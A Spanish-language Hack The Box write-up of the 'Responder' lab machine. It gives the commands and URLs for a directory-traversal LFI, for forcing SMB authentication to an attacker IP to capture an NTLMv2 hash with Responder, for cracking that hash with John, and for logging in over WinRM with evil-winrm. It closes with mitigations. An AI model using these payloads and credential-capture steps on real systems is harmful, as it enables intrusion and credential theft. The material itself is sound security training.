# Responder — HTB

**Plataforma:** Hack The Box
**Dificultad:** Fácil
**Categoría:** Windows / Web / LFI / NTLM

---

## 1. 🔎 Reconocimiento

### Nmap

```bash
nmap -sCV -p- -Pn 10.129.162.110
```

Encontramos:

* `80/tcp` → HTTP
* `5985/tcp` → WinRM
* `7680/tcp` → Pando-Pub

La aplicación web nos redirige a:

```text
unika.htb
```

Añadimos el dominio al fichero `/etc/hosts`:

```text
10.129.162.110 unika.htb
```

### ¿Por qué hacemos esto?

Cuando una aplicación utiliza un dominio en lugar de una IP, el navegador necesita resolver ese dominio a una dirección IP.

Normalmente esto lo hace mediante DNS, pero en un laboratorio de HTB podemos hacerlo manualmente con `/etc/hosts`.

Así, cuando escribimos:

```text
http://unika.htb
```

nuestro equipo sabe que debe conectarse a:

```text
10.129.162.110
```

---

## 2. 📋 Enumeración

### Enumeración web

Accedemos a:

```text
http://unika.htb
```

Observamos que la página tiene un parámetro relacionado con el idioma:

```text
?page=
```

Por ejemplo:

```text
http://unika.htb/index.php?page=fr
```

Esto es interesante porque el parámetro `page` parece utilizarse para indicar qué archivo debe cargar la aplicación.

### LFI — Local File Inclusion

Probamos si podemos utilizar el parámetro para acceder a archivos locales del servidor:

```text
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

La secuencia:

```text
../
```

permite subir un directorio.

Por ejemplo:

```text
../../
```

significa:

```text
directorio actual
   ↓
../       → subir un nivel
../       → subir otro nivel
```

Al repetirlo muchas veces intentamos salir del directorio donde la aplicación busca normalmente los archivos y acceder a otras ubicaciones del sistema.

El archivo:

```text
C:\Windows\System32\drivers\etc\hosts
```

es un archivo real de Windows que contiene asociaciones locales entre nombres de host e IPs.

Si conseguimos leerlo, confirmamos que tenemos una **Local File Inclusion (LFI)**.

---

### Intentamos convertir el LFI en una petición SMB

Una LFI normalmente permite leer archivos **locales**.

Pero aquí queremos conseguir algo diferente: que el servidor Windows se conecte a nuestra máquina.

Probamos:

```text
http://unika.htb/?page=//10.10.14.173/somefile
```

También podemos probar:

```text
http://unika.htb/10.10.14.173/somefile
```

La idea importante es esta:

```text
Servidor Windows
       |
       | intenta acceder a
       ↓
\\10.10.14.173\somefile
       |
       ↓
Nuestra máquina
```

En Windows, una ruta que comienza con:

```text
\\IP\
```

puede utilizar SMB.

Si conseguimos que el servidor intente acceder a un recurso SMB controlado por nosotros, Windows puede intentar autenticarse contra nuestra máquina.

---

## 3. 💥 Explotación

### Responder

Utilizamos **Responder** para escuchar determinados protocolos de red y capturar intentos de autenticación.

```bash
sudo responder -I tun0
```

> La interfaz puede variar dependiendo de la configuración de la VPN. En HTB normalmente utilizaremos la interfaz correspondiente a nuestra conexión VPN.

Ahora hacemos que el servidor visite nuestra dirección mediante el parámetro vulnerable:

```text
http://unika.htb/?page=//10.10.14.173/somefile
```

La cadena de ataque es:

```text
LFI
 ↓
El servidor intenta acceder a nuestra IP
 ↓
Windows intenta autenticarse mediante SMB
 ↓
Responder recibe la autenticación
 ↓
Obtenemos un hash NTLMv2
```

Responder muestra:

```text
[SMB] NTLMv2-SSP Client   : 10.129.162.122
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:...
```

Hemos conseguido capturar el **challenge-response NTLMv2** del usuario `Administrator`.

### ¿Qué hemos conseguido realmente?

Importante: **todavía no tenemos la contraseña**.

Lo que tenemos es una respuesta de autenticación NTLMv2:

```text
Administrator::RESPONDER:<challenge>:<response>
```

Esta información puede utilizarse para intentar recuperar la contraseña mediante **cracking offline**.

---

### Cracking del hash

Guardamos el hash capturado en:

```text
hash.txt
```

Y utilizamos John the Ripper:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

### ¿Qué hace John?

John prueba las contraseñas de `rockyou.txt` contra el hash capturado.

Por ejemplo:

```text
password1
password123
badminton
...
```

Para cada contraseña calcula la respuesta NTLM correspondiente y comprueba si coincide con el hash capturado.

Finalmente obtenemos:

```text
badminton
```

Por tanto tenemos:

```text
Usuario: administrator
Contraseña: badminton
```

---

### Acceso mediante WinRM

El puerto `5985` que encontramos durante el reconocimiento corresponde a **WinRM (Windows Remote Management)**.

Podemos utilizar `evil-winrm` para conectarnos:

```bash
evil-winrm -i 10.129.162.122 -u administrator -p badminton
```

Obtenemos una sesión remota en Windows.

Podemos comprobar nuestro usuario:

```powershell
whoami
```

Y obtenemos:

```text
unika\administrator
```

---

### ¿Por qué utilizamos Evil-WinRM si estamos en Linux?

Porque **WinRM es un protocolo de administración remota de Windows**, y `evil-winrm` es una herramienta disponible en Linux que implementa un cliente para conectarnos a ese servicio.

No necesitamos tener PowerShell instalado en nuestra máquina Linux.

La situación es:

```text
                 RED
                  |
                  ↓
        ┌──────────────────┐
        │  Nuestra Kali    │
        │                  │
        │  evil-winrm      │
        └────────┬─────────┘
                 │
                 │ WinRM :5985
                 ↓
        ┌──────────────────┐
        │ Servidor Windows │
        │                  │
        │ PowerShell       │
        └──────────────────┘
```

`evil-winrm` actúa como **cliente** desde Linux.

La sesión que obtenemos se ejecuta en el **Windows remoto**, donde sí existe PowerShell.

Por eso no importa que nuestra máquina sea Linux.

---

## 4. ⬆️ Escalada de privilegios

En este caso conseguimos autenticarnos directamente como:

```text
administrator
```

Por tanto, antes de buscar una escalada de privilegios debemos comprobar qué nivel de privilegios tenemos:

```powershell
whoami
```

```powershell
whoami /groups
```

Si el usuario `Administrator` tiene privilegios administrativos, no necesitamos realizar una escalada adicional para obtener acceso privilegiado.

---

## 5. 📄 Reporte

### Resumen

La máquina expone una aplicación web vulnerable a **Local File Inclusion (LFI)** mediante el parámetro `page`.

La vulnerabilidad permite manipular la ruta utilizada por la aplicación y, además, provocar que el servidor Windows intente acceder a un recurso controlado por nuestra máquina.

Al provocar una conexión SMB hacia nuestra máquina y utilizar Responder, conseguimos capturar una autenticación **NTLMv2** del usuario `Administrator`.

Posteriormente utilizamos John the Ripper junto con `rockyou.txt` para crackear el hash y recuperar la contraseña:

```text
badminton
```

Finalmente utilizamos las credenciales obtenidas para conectarnos al servicio **WinRM** expuesto en el puerto `5985` mediante `evil-winrm`.

### Cadena de ataque

```text
LFI
 ↓
Forced SMB Authentication
 ↓
Responder
 ↓
NTLMv2 Hash
 ↓
John the Ripper
 ↓
Administrator : badminton
 ↓
WinRM : 5985
 ↓
Acceso remoto a Windows
```

### Vulnerabilidades encontradas

| Vulnerabilidad            | Severidad | Impacto                                                                |
| ------------------------- | --------- | ---------------------------------------------------------------------- |
| LFI                       | Alta      | Lectura de archivos y posibilidad de interacción con recursos externos |
| Forced SMB Authentication | Alta      | Captura de autenticaciones NTLM                                        |
| Contraseña débil          | Alta      | Permite crackear el hash                                               |
| WinRM expuesto            | Media     | Permite acceso remoto con credenciales válidas                         |

### Mitigaciones

* Validar y restringir los valores aceptados por el parámetro `page`.
* No permitir traversal mediante `../`.
* Aplicar una whitelist de archivos permitidos.
* Evitar que el servidor Windows realice conexiones SMB hacia hosts externos cuando no sean necesarias.
* Deshabilitar o restringir NTLM cuando sea posible.
* Utilizar contraseñas fuertes y resistentes al cracking.
* Restringir el acceso al servicio WinRM mediante firewall y segmentación de red.

---

## 🧠 Lessons Learned

* `/etc/hosts` permite resolver localmente un dominio hacia una IP.
* `../` permite realizar **directory traversal**.
* Una **LFI** puede utilizarse no solo para leer archivos, sino también como parte de ataques más complejos.
* Windows puede intentar autenticarse automáticamente al acceder a determinados recursos SMB.
* **Responder** permite capturar determinados intentos de autenticación de red.
* Un hash **NTLMv2 no es la contraseña**: es una respuesta de autenticación que podemos intentar crackear offline.
* John the Ripper puede probar diccionarios como `rockyou.txt` contra hashes capturados.
* **WinRM** utiliza normalmente el puerto `5985` para HTTP.
* `evil-winrm` permite conectarnos desde Linux a un Windows remoto mediante WinRM.
* No necesitamos PowerShell en Linux: PowerShell se ejecuta en el **Windows remoto** al que nos conectamos.
